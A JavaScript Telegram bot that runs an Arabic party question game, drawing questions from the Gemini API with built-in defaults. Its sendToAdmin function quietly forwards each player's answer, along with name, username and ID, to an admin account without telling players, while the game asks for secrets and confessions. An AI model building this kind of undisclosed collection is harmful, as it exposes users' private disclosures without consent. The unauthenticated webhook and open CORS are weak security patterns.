// api/bot.js
import fetch from "node-fetch";

/* ========== الإعدادات ========== */
const BOT_TOKEN = process.env.BOT_TOKEN;
const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
const ADMIN_ID = process.env.ADMIN_ID || "none";

const GEMINI_API_URL =
  "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent";

/* ========== أنواع اللعبة ========== */
const GAME_TYPES = {
  comedy: "😂 أسئلة كوميدية",
  truth: "🔥 صراحة وجرأة",
  free: "🗣️ تحدث بدون حواجز",
  love: "❤️ أسئلة غرامية",
  couples: "💞 أسئلة للعشاق",
  funny: "🤣 مضحكة",
  daily: "📔 يوميات",
  personality: "🧠 شخصية"
};

/* ========== حالة المستخدم ========== */
const userState = new Map(); // chatId => { type, question, userId }

/* ========== الأسئلة الافتراضية ========== */
const DEFAULT_QUESTIONS = {
  comedy: [
    "إذا كنت ستتحول إلى حيوان ليوم واحد، فماذا تختار ولماذا؟",
    "ما هو أغرب شيء فعلته عندما كنت لوحدك؟",
    "ما هو أسوأ لقب أطلقه عليك أحدهم؟",
    "ما هو أغرب حلم تتذكره؟",
    "إذا كان بإمكانك اختراع عطلة جديدة، ماذا ستكون وكيف تحتفل بها؟"
  ],
  truth: [
    "ما هو أكبر سر لم تخبر به أحداً من قبل؟",
    "ما هو الشيء الذي تخجل منه لكنك تفعله سراً؟",
    "ما هو أسوأ خطأ ارتكبته في حياتك؟",
    "ما هو الشيء الذي تتمنى أن تعود بالزمن وتغيره؟",
    "ما هو أكبر كذبة قلتها لشخص عزيز عليك؟"
  ],
  free: [
    "ما هو الشيء الذي يجعلك تبكي بسرعة؟",
    "ما هو أكبر خوف لديك؟",
    "ما هو الشيء الذي تتمنى أن تسمعه من شخص معين؟",
    "ما هو أكثر موقف جعلك تشعر بالضعف؟",
    "ما هو الشيء الذي تندم على عدم قوله؟"
  ],
  love: [
    "ما هو أكثر شيء رومانسي فعلته من أجل شخص تحبه؟",
    "ما هو تعريفك للحب الحقيقي؟",
    "ما هو أكثر شيء يجعلك تشعر بالحب؟",
    "ما هي الصفة التي تبحث عنها في شريك الحياة؟",
    "ما هو أجمل اعتراف حب سمعته في حياتك؟"
  ],
  couples: [
    "ما هو أول شيء لاحظته في شريكك؟",
    "ما هي العادة الغريبة لشريكك التي تحبها؟",
    "ما هو أكثر شيء تفتقده عندما تكون بعيداً عن حبيبك؟",
    "ما هي الذكرى المفضلة لديك مع شريكك؟",
    "ما هي الكلمة التي تود أن تسمعها من شريكك دائماً؟"
  ],
  funny: [
    "ما هو أغرب شيء حدث لك أثناء موعد غرامي؟",
    "ما هو أسوأ هدية تلقيتها في حياتك؟",
    "ما هو أكثر موقف محرج تعرضت له؟",
    "ما هي العادة الغريبة التي لديك وتخفيها عن الجميع؟",
    "ما هو أسوأ طبق طبختِه في حياتك؟"
  ],
  daily: [
    "ما هو أول شيء تفعله عندما تستيقظ من النوم؟",
    "ما هو روتينك اليومي المفضل؟",
    "ما هو الشيء الذي يشعرك بالسعادة في يومك؟",
    "ما هي العادة اليومية التي تود التخلص منها؟",
    "ما هو أفضل جزء في يومك عادة؟"
  ],
  personality: [
    "ما هي الصفة التي تحبها في شخصيتك؟",
    "ما هو الشيء الذي يغضبك بسرعة؟",
    "ما هي الموهبة التي تتمنى أن تمتلكها؟",
    "كيف تصف نفسك في ثلاث كلمات؟",
    "ما هو الشيء الذي يجعلك تشعر بالفخر؟"
  ]
};

/* ========== الردود على الإجابات ========== */
const RESPONSES = [
  "💫 إجابة رائعة!",
  "🎯 نقطة مهمة!",
  "🌟 شكراً لمشاركتك!",
  "✨ إجابة مميزة!",
  "💭 تفكير جميل!",
  "🎨 إجابة إبداعية!",
  "💝 شكراً لصراحتك!",
  "🚀 رد ممتاز!",
  "🌺 جميل ما تقول!",
  "💡 فكرة رائعة!",
  "🤝 شكراً للثقة!",
  "🌅 إجابة مشرقة!",
  "🎭 تعليق جميل!",
  "💎 إجابة ثمينة!",
  "🌸 شكراً لمشاركتنا مشاعرك!"
];

function getRandomResponse() {
  const randomIndex = Math.floor(Math.random() * RESPONSES.length);
  return RESPONSES[randomIndex];
}

/* ========== Telegram Helpers ========== */
async function sendMessage(chatId, text, extra = {}) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "Markdown",
        ...extra
      })
    });
    
    if (!response.ok) {
      console.error(`Failed to send message: ${response.status}`);
    }
    
    return response;
  } catch (error) {
    console.error("Error sending message:", error);
  }
}

async function answerCallbackQuery(callbackQueryId, text = "", showAlert = false) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text: text,
        show_alert: showAlert
      })
    });
  } catch (error) {
    console.error("Error answering callback query:", error);
  }
}

/* ========== توليد الأسئلة من Gemini ========== */
function buildPrompt(typeName) {
  return `أنت مولد أسئلة للعبة أسئلة وأجوبة. 
أنشئ سؤالاً واحداً فقط.
نوع السؤال: ${typeName}
اللغة: العربية
السؤال يجب أن يكون:
- قصيراً (جملة واحدة)
- واضحاً وسهلاً
- مناسباً للعبة جماعية
- محفزاً للتفكير أو النقاش`;
}

async function getGeminiResponse(promptText) {
  try {
    const response = await fetch(GEMINI_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-goog-api-key": GEMINI_API_KEY
      },
      body: JSON.stringify({
        contents: [{ 
          parts: [{ 
            text: promptText 
          }] 
        }]
      })
    });

    const data = await response.json();
    const question = data.candidates?.[0]?.content?.parts?.[0]?.text;
    
    return question || null;
  } catch (error) {
    console.error("Gemini API error:", error);
    return null;
  }
}

/* ========== توليد سؤال ========== */
async function generateQuestion(typeKey) {
  const typeName = GAME_TYPES[typeKey];
  
  try {
    const prompt = buildPrompt(typeName);
    const question = await getGeminiResponse(prompt);
    
    if (question && question.length > 5) {
      return question.trim();
    }
  } catch (error) {
    console.error("Error generating question:", error);
  }
  
  // استخدم الأسئلة الافتراضية إذا فشل Gemini
  const questions = DEFAULT_QUESTIONS[typeKey] || DEFAULT_QUESTIONS.comedy;
  const randomIndex = Math.floor(Math.random() * questions.length);
  return questions[randomIndex];
}

/* ========== أزرار القائمة ========== */
function gameMenu() {
  const keyboard = [
    [{ text: "😂 كوميديا", callback_data: "game_comedy" }, { text: "🔥 صراحة", callback_data: "game_truth" }],
    [{ text: "🗣️ بدون حواجز", callback_data: "game_free" }, { text: "❤️ غرامية", callback_data: "game_love" }],
    [{ text: "💞 للعشاق", callback_data: "game_couples" }, { text: "🤣 مضحكة", callback_data: "game_funny" }],
    [{ text: "📔 يوميات", callback_data: "game_daily" }, { text: "🧠 شخصية", callback_data: "game_personality" }],
    [{ text: "❓ تلقائي", callback_data: "game_random" }]
  ];
  
  return keyboard;
}

/* ========== أزرار بعد السؤال ========== */
function afterQuestionButtons() {
  return [
    [{ text: "🔄 سؤال جديد", callback_data: "next_question" }],
    [{ text: "🔙 أنواع أخرى", callback_data: "change_type" }]
  ];
}

/* ========== إرسال للأدمن ========== */
async function sendToAdmin(user, question, answer) {
  try {
    if (!ADMIN_ID || ADMIN_ID === "none") {
      return;
    }
    
    const msg = `
📥 *إجابة جديدة*

👤 *المستخدم:*
${user.first_name || ""} ${user.last_name || ""}
@${user.username || "لا يوجد"}
🆔 ${user.id}

❓ *السؤال:*
${question}

💬 *الإجابة:*
${answer}
`;
    await sendMessage(ADMIN_ID, msg);
  } catch (error) {
    console.error("Error sending to admin:", error);
  }
}

/* ========== Handler الرئيسي ========== */
export default async function handler(req, res) {
  // تمكين CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method === "GET") {
    return res.status(200).json({ 
      status: "✅ البوت يعمل",
      bot_name: "لعبة الأسئلة التفاعلية",
      game_types: Object.keys(GAME_TYPES).length,
      active_users: userState.size
    });
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "الطريقة غير مسموحة" });
  }

  try {
    const update = req.body;
    
    // توثيق الطلبات الواردة
    console.log("📨 Update received:", update);

    /* ====== معالجة أزرار Inline ====== */
    if (update.callback_query) {
      const callback = update.callback_query;
      const chatId = callback.message.chat.id;
      const user = callback.from;
      const data = callback.data;

      console.log(`🔘 Callback: ${data} from ${user.id}`);

      // إجابة فورية للزر
      await answerCallbackQuery(callback.id, "جارٍ التحميل...");

      // اختيار نوع عشوائي
      if (data === "game_random") {
        const types = Object.keys(GAME_TYPES);
        const randomType = types[Math.floor(Math.random() * types.length)];
        const question = await generateQuestion(randomType);
        
        userState.set(chatId, { 
          type: randomType, 
          question: question,
          userId: user.id 
        });

        await sendMessage(chatId, `🎲 *سؤال عشوائي*\n\n❓ ${question}\n\n💭 الآن اكتب إجابتك:`, {
          reply_markup: {
            inline_keyboard: afterQuestionButtons()
          }
        });
      }
      
      // اختيار نوع محدد
      else if (data.startsWith("game_")) {
        const typeKey = data.replace("game_", "");
        
        if (!GAME_TYPES[typeKey]) {
          await sendMessage(chatId, "⚠️ هذا النوع غير متوفر حالياً");
          return res.status(200).end();
        }

        const question = await generateQuestion(typeKey);
        
        userState.set(chatId, { 
          type: typeKey, 
          question: question,
          userId: user.id 
        });

        await sendMessage(chatId, `*${GAME_TYPES[typeKey]}*\n\n❓ ${question}\n\n💭 الآن اكتب إجابتك في الرسالة التالية:`, {
          reply_markup: {
            inline_keyboard: afterQuestionButtons()
          }
        });
      }

      // سؤال آخر
      else if (data === "next_question") {
        const state = userState.get(chatId);
        
        if (!state) {
          await sendMessage(chatId, "⚠️ ابدأ اللعبة أولاً بالضغط على /start");
          return res.status(200).end();
        }

        const question = await generateQuestion(state.type);
        
        state.question = question;
        userState.set(chatId, state);

        await sendMessage(chatId, `❓ ${question}\n\n💭 اكتب إجابتك:`, {
          reply_markup: {
            inline_keyboard: afterQuestionButtons()
          }
        });
      }

      // تغيير النوع
      else if (data === "change_type") {
        await sendMessage(chatId, "🎮 *اختر نوع اللعبة:*\n\nأي نوع تفضل؟", {
          reply_markup: {
            inline_keyboard: gameMenu()
          }
        });
      }

      return res.status(200).end();
    }

    /* ====== معالجة الرسائل النصية ====== */
    if (!update.message) {
      return res.status(200).end();
    }

    const message = update.message;
    const chatId = message.chat.id;
    const text = message.text || "";
    const user = message.from;

    console.log(`💬 Message: "${text}" from ${user.id}`);

    // أمر /start
    if (text === "/start" || text === "/start@") {
      await sendMessage(
        chatId,
        `🎮 *مرحباً ${user.first_name || "صديقي"}!*\n\n` +
        `*لعبة الأسئلة التفاعلية*\n\n` +
        `اختر نوع الأسئلة المناسب لك:\n` +
        `• 💬 شارك أفكارك\n` +
        `• 🤔 فكر في الإجابات\n` +
        `• 😄 استمتع باللعبة\n\n` +
        `*كيفية اللعب:*\n` +
        `1️⃣ اختر نوع الأسئلة\n` +
        `2️⃣ اقرأ السؤال\n` +
        `3️⃣ اكتب إجابتك\n` +
        `4️⃣ احصل على رد\n` +
        `5️⃣ كرر أو غير النوع`,
        {
          reply_markup: {
            inline_keyboard: gameMenu()
          }
        }
      );
      return res.status(200).end();
    }

    // أمر /menu
    if (text === "/menu" || text === "/help") {
      await sendMessage(chatId, "🎮 *اختر نوع اللعبة:*", {
        reply_markup: {
          inline_keyboard: gameMenu()
        }
      });
      return res.status(200).end();
    }

    // إجابة المستخدم على سؤال
    const state = userState.get(chatId);
    if (state && text && !text.startsWith("/")) {
      // إرسال الإجابة للإدمن
      await sendToAdmin(user, state.question, text);
      
      // إرسال رد للمستخدم
      const randomResponse = getRandomResponse();
      await sendMessage(
        chatId,
        `${randomResponse}\n\n` +
        `📝 *سؤالك:* ${state.question}\n` +
        `📤 *إجابتك:* ${text}\n\n` +
        `✨ *ماذا تريد الآن؟*`,
        {
          reply_markup: {
            inline_keyboard: afterQuestionButtons()
          }
        }
      );
      
      return res.status(200).end();
    }

    // إذا كتب رسالة بدون لعبة نشطة
    if (text && !text.startsWith("/")) {
      await sendMessage(
        chatId,
        "🎮 *لم تبدأ اللعبة بعد!*\n\n" +
        "اضغط /start لبدء لعبة الأسئلة أو اختر نوعاً من القائمة أدناه:",
        {
          reply_markup: {
            inline_keyboard: gameMenu()
          }
        }
      );
      return res.status(200).end();
    }

    return res.status(200).end();

  } catch (error) {
    console.error("❌ Handler error:", error);
    return res.status(200).json({ error: "حدث خطأ داخلي" });
  }
}
